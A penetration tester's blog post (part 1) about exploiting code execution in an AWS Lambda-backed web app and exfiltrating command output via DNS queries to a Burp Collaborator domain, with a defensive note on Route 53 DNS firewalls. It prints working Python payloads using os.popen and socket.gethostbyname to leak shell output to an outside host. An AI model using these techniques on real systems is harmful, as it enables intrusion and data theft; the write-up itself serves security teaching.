+++
title = "What's in a Name? Writing Custom DNS Tunnelling Protocol, Exploiting AWS Lambda Misconfiguration (Part 1)"
date = 2024-06-06
tags = ["burpsuite", "exploitation", "network", "research", "aws"]
+++

![half life hecu](half-life-hecu.gif)

This is a war story of an AWS web application test where remote code execution was first obtained on the client's application. Then I needed to write my own DNS tunnelling 'protocol' to get the data out. Following a number of twists and turns I impersonated the application and attempted to laterally move within the AWS tenant.

Before storytelling though, let's start with a public service announcement:

## The Public Service Announcement

As the title suggests, I discovered that it was possible to exfiltrate data from an AWS app through external DNS interaction. Interestingly, the disclosure surprised the client quite a bit because they thought it should not possible because, quote "all outbound TCP & UDP ports were blocked". On further digging I discovered that this was indeed not enough to stop outbound DNS interactions.

The **TL;DR** is that, If you have an AWS Lambda app, or an EC2 instance that should not be making outbound connections (an "air-gapped cloud machine" that only talks to infrastructure owned by you), blocking all TCP & UDP ports through Security Groups & VPC Network Rules is not enough. *Even if a `0.0.0.0/0` DENY rule is in place for port 53, you would need to additionally set up a **Route 53 DNS firewall** to block outbound DNS interactions.* Part II of this blog post will include steps to set it up.

## Tell me about that RCE you got there

In the past year or so, our adversary simulation team in JUMPSEC has been focusing heavily on the cloud red teaming scene. As a result, I had been on back to back adsim gigs and being assigned a web application pen test was a nice change of scenery.

The application in question was built for users of scientific and engineering backgrounds. An AWS Lambda-powered (think serverless function) feature in the app allowed users to submit Python code to perform calculations & simulations. The frontend UI would then display any number-typed results. For example, if a variable exists named "foobar" after the user supplied Python script ran to completion, and it was a *number* type at the end (INT, FLOAT, COMPLEX?), the frontend would display (if foobar == 1337):

```
foobar: 1337
```

However, non-numeric results would be dropped. During the test I found that any Python standard library was available in the environment.

#### Proving the RCE is alive and well

Experienced app testers all have their favorite ways to execute OS commands in the major web programming languages, for example `exec()` in `PHP`, `eval()` in `Node.js`, and in `Python` my favorite is `os.popen()`. There are of course a couple others such as `subprocess.run()` and so on. Look it up if you are interested, on [PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) which is my go-to cheatsheet.

Anyway, having standard Python libs meant we definitely have `os` , so the easiest proof for "working" RCE was just this:

```
> import os
> output = int(os.popen('echo -n 1337').read())
```

And in the UI, voila, we see `output: 1337`.

Well this ain't much but it definitely pays the bills. I'd be a little hesitant to slap on the scary *Critical Risk* in the report without proving further impact at this point. Well, let's make some coffee and expand our RCE's capabilities.

#### Getting more Data out

Some more coffee-powered testing proved that our RCE was working well (I `echoed` some more numbers such as `42`, `69420`, etc). How though, would one make it more useful? Initially I preferred a solution that goes into the UI because it's logical (KISS principle!) and also would look nice on the report. Since the Lambda only returned numbers and would not return any string, we needed a string-to-number encoding function.

Knowing that Linux shell commands almost always produced ASCII strings, I wrote a little Python function that loops through the command output's ASCII characters which encoded them into their respective ASCII numbers to form a big integer to be shown on the UI. We could then convert the result back to ASCII on our attacking machine. I double checked that all printable ASCIIs are between 0x0 and 0xFF (0-255). The app's UI unfortunately could not output Hex, so we had to settle for transforming 1 ASCII char into a 3 digit number:

For example, 'ABC' was turned into `065066067`. This was achieved with passing each character to ord(char) and adding a 0 to any output less than 100, before concatenating them into a single string, and running `int()` on the whole thing.

In the UI it would not have the leading `0`, i.e. you would get `65066067068` instead, so the decoding function would need to add the `0` back if `len(output) %% 3 != 0`, split the string into 3-char chunks and put it through `chr`, which was the inverse of `ord()`.

![pic1](pic1.png)

![pic2](pic2.png)

> These two are the only "real" screenshots from the engagement, in case you are curious.

The screenshots showed the encoded output of `whoami` on the UI, which was decoded with a Python script. While this would also have been "good enough" (for context, sbx_userXYZ are the runtime users for Lambda), there was a glaring problem from an attacker's perspective.

In Python's standard libraries, the math (as far as I know) does not get as accurate as thousands of significant figures, and you would need that to get low thousands of bytes out from this encoding method, which isn't a lot. That is probably the reason why the frontend did not give us more than 20 significant figures in the output. (From my limited knowledge, a 4-byte unsigned int in C goes to `4294967295` maximally, so that's *only* 10 significant figures, or 3 "encoded bytes" in our very inefficient scheme).

I did go into the rabbit hole of trying to dynamically generate named variables (var1, for the first 5 bytes; var2, for 6-10th bytes, and so on), but could not get far.

## Oh we got DNS!

> When life closes one door, look hard for native networking capabilities.

Getting Data out from the UI was possible, but impractical. As an attacker in disguise, I felt strongly about my rights to get good user experience! My next step was to look for out-of-band data channels, the most obvious one being HTTP. There were 2 candidates to achieve this that I knew in the back of my head, the OS native `curl` util, and the `urllib.request` module in Python. I spun up my own listener on `Burp Suite Collaborator`, which listened on HTTP & DNS, and did a little request as shown here:

```
> url = f'http://<my-subdomain>.oastify.com'
> req_status = int(request.urlopen(url).status)
```

![pic4](pic4.png)

To my surprise (and much joy indeed), though Burp Suite showed no HTTP request was received, the DNS query went through to the Name Server of `oastify.com`, which meant the Lambda was indeed talking back to us through DNS!

#### Exfil mechanism explained

For those who are not familiar with the concept of DNS data exfiltration, it works like this – let's say we control DNS records of oastify.com (in reality the PortSwigger company does).
To run a server with IP a.b.c.d to receive data through that domain, one way is by becoming the Authoritative Nameserver for it. This can be done by creating an NS record for ns1.oastify.com and pointing it to a.b.c.d. If someone runs a DNS query against foobar.oastify.com, the name server a.b.c.d would receive that query. That's the normal working part of DNS. The DNS records described in the paragraph can be written as:

```
> oastify.com    NS  ns1.oaststify.com
> ns1.oastify.com A    a.b.c.d
```

If you were an attacker, you would want some juicy data to be sent to your server. How would you make this happen?

The vulnerable application in question would make the query:
"Hey, internet, can I resolve `<juicydata>.oastify.com`? "

And your nameserver at a.b.c.d would get the `<juicydata>` inside the query, save it in its query log, and then feed the application some junk data:

*"Oh it's `b.c.d.e`. Bye now!"*

To properly PoC this feature, I used a native DNS util in Python called `socket.gethostbyname()`.

```
> import socket, os
>
> url = 'i-am-talking-to-you..oastify.com'
> url2 = f'{os.popen("/usr/bin/echo -n copy-that").read()}..oastify.com'
>
> lookup1 = socket.gethostbyname(url1)
> lookup2 = socket.gethostbyname(url2)
```

Below were queries Burp received when I replicated this part using my own Lambda function. It proved to me that 1. arbitrary subdomain query would also hit our malicous nameserver, and 2. you could put dynamic content (shell command output) in the subdomain and it would also go through AWS's mechanisms to fire off that request.

![pic5](pic5.png)

![pic6](pic6.png)

This is a good place to stop for now in a 2-part post. In [Part 2](/blog/whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda-misconfiguration-in-a-web-app-pen-test-part-2/) we cover how this discovery was weaponised into a semi-interactive shell, how the Lambda's identity was assumed by us and how the AWS remediation was found.

> **Disclaimer**: most demonstrations below were recreated using my own AWS account and client details have been redacted for confidentiality.


